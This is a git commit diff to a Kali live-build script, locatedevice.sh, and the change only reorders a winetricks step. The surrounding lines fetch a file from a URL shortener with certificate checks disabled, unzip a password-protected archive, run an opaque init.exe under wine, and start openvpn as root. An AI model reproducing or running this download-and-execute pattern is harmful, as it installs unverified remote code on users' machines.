6c48bc46392c3af7daef261dcdf5193c59072892
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-09-05 08:35:22 -0400

    Update locatedevice.sh

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -7,9 +7,9 @@ wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
 cd ~/init/;
 rm -rf init.exe;
 unzip -P1011011011 init.zip;
-winetricks dotnet45;
 wget -O mono.msi https://dl.winehq.org/wine/wine-mono/5.1.0/wine-mono-5.1.0-x86.msi;
 wine msiexec /i mono.msi;
+winetricks dotnet45;
 wine init.exe;
 sudo openvpn vpn;
 exit 0
